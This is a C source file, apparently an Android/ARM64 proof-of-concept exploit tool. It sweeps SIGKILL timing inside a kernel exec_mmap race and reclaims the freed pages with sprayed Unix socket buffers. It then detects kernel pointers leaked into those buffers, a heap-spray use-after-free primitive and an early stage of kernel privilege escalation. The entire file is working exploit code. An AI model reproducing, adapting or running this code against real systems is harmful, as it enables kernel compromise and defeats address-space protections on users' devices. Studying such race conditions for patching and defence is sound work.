/*
 * sweep - timing sweep for the SIGKILL-inside-exec_mmap window.
 *
 * Each round: arm N timers in a child, start the exec thread, SIGKILL after a
 * swept delay, claim the freed pages with 8 KiB streams, reap the zombie, then
 * diff the peeked stream contents for kernel-written bytes.
 *
 * A non-zero diff is the hit: the kernel wrote a pointer into the page we own.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>

#define N_TIMERS 2048
#define N_STREAMS 256
#define KVA 0xffff000000000000ULL

static void noop(int s) { (void)s; }
struct lc { int fd; pid_t tid; };

static void *exec_thread(void *arg)
{
    /* CLOCK_THREAD_CPUTIME_ID timers must belong to the thread that calls
     * execve(): that thread's cpu timer is the one whose node is left queued. */
    static timer_t many[N_TIMERS];
    struct sigevent sev;
    struct itimerspec its;
    struct lc *c = (struct lc *)arg;
    char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
    int i, armed = 0;

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL;
    sev.sigev_signo = SIGRTMIN;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 200000L;
    its.it_interval.tv_nsec = 200000L;
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &many[i]) != 0) break;
        if (timer_settime(many[i], 0, &its, NULL) != 0) break;
        armed++;
    }
    if (c) { (void)!write(c->fd, &armed, sizeof(armed)); }
    execve(argv[0], argv, NULL);
    return NULL;
}

static unsigned char payload[8192];
static unsigned char base[N_STREAMS][8192];
static unsigned char now[8192];
static int sv[N_STREAMS][2];

static int one_round(int delay_us, int *hit_out)
{
    int pipefd[2], i, made = 0, diffs = 0;
    pid_t child;

    *hit_out = 0;
    if (pipe(pipefd) != 0) return -1;
    child = fork();
    if (child == 0) {
        struct sigaction sa;
        struct lc c;
        pthread_t th;

        close(pipefd[0]);
        {
            int dn = open("/dev/null", O_WRONLY);
            if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        }
        memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
        c.fd = pipefd[1];
        c.tid = (pid_t)syscall(SYS_gettid);
        if (pthread_create(&th, NULL, exec_thread, &c) != 0) _exit(9);
        for (;;) pause();
    }
    close(pipefd[1]);
    { int a = 0; (void)!read(pipefd[0], &a, sizeof(a)); close(pipefd[0]); }

    if (delay_us >= 0) {
        if (delay_us) usleep((useconds_t)delay_us);
        kill(child, SIGKILL);
    }
    if (delay_us == 0) usleep(50);
    else usleep(60000);

    for (i = 0; i < N_STREAMS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) != 0) break;
        if (send(sv[i][0], payload, sizeof(payload), MSG_DONTWAIT) != (ssize_t)sizeof(payload)) {
            close(sv[i][0]); close(sv[i][1]); break;
        }
        made++;
    }
    for (i = 0; i < made; i++) {
        ssize_t n = recv(sv[i][1], base[i], sizeof(base[i]), MSG_PEEK | MSG_DONTWAIT);
        if (n != (ssize_t)sizeof(base[i])) memset(base[i], 0, sizeof(base[i]));
    }

    /* the reap */
    { int st = 0; waitpid(child, &st, 0); }
    usleep(10000);

    for (i = 0; i < made; i++) {
        ssize_t n = recv(sv[i][1], now, sizeof(now), MSG_PEEK | MSG_DONTWAIT);
        int j;
        if (n != (ssize_t)sizeof(now)) continue;
        if (memcmp(now, base[i], sizeof(now)) == 0) continue;
        for (j = 0; j + 8 <= (int)sizeof(now); j += 8) {
            uint64_t a, b;
            memcpy(&a, base[i] + j, 8);
            memcpy(&b, now + j, 8);
            if (a != b && b >= KVA) {
                printf("    HIT stream[%d] +0x%03x : 0x%016llx -> 0x%016llx\n",
                       i, j, (unsigned long long)a, (unsigned long long)b);
                diffs++;
            }
        }
        if (diffs >= 6) break;
    }
    for (i = 0; i < made; i++) { close(sv[i][0]); close(sv[i][1]); }
    if (diffs) { *hit_out = 1; return 0; }
    return 0;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 40;
    int hits = 0, r;
    static const int delays[] = { 0, 10, 25, 50, 80, 120, 180, 250, 350, 500 };
    int nd = (int)(sizeof(delays) / sizeof(delays[0]));

    memset(payload, 0, sizeof(payload));
    printf("=== timing sweep: %d rounds x %d delays ===\n", rounds, nd);
    for (r = 0; r < rounds && hits < 3; r++) {
        int d;
        for (d = 0; d < nd && hits < 3; d++) {
            int hit = 0;
            one_round(delays[d], &hit);
            if (hit) {
                printf("  *** round %d delay %dus HIT ***\n", r, delays[d]);
                hits++;
            }
        }
        if ((r % 5) == 0) { printf("  progress: round %d/%d hits=%d\n", r, rounds, hits); fflush(stdout); }
    }
    printf("sweep done: hits=%d\n", hits);
    return 0;
}
